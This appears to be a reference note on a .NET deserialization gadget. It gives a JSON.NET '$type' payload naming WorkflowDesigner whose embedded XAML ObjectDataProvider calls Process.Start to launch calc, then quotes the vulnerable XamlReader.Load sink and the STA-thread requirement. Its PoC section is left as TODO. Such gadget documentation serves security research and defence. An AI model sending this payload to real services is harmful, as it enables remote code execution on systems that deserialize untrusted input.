# Sample JSON payload

```json
{"$type":"System.Activities.Presentation.WorkflowDesigner,
System.Activities.Presentation, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=31bf3856ad364e35",
"PropertyInspectorFontAndColorData":"<ResourceDictionary
xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"
  xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"
  xmlns:System=\"clr-namespace:System;assembly=mscorlib\"
  xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">
     <ObjectDataProvider x:Key=\"LaunchCalc\"
        ObjectType=\"{x:Type Diag:Process}\"
        MethodName=\"Start\">
        <ObjectDataProvider.MethodParameters>
            <System:String>calc</System:String>
        </ObjectDataProvider.MethodParameters>
</ObjectDataProvider> </ResourceDictionary>"
}
```

# Source code

```csharp
// System.Activities.Presentation.WorkflowDesigner
public void set_PropertyInspectorFontAndColorData(string value)
{
...
StringReader input = new StringReader(value);
XmlReader reader = XmlReader.Create(input);
Hashtable hashtable = (Hashtable)XamlReader.Load(reader);
```

# Attack vector

Execute static method during parsing of Xaml payload.

# Requirements

Constructor of this Type requires Single-Threaded-Apartment (STA) thread

# PoC

TODO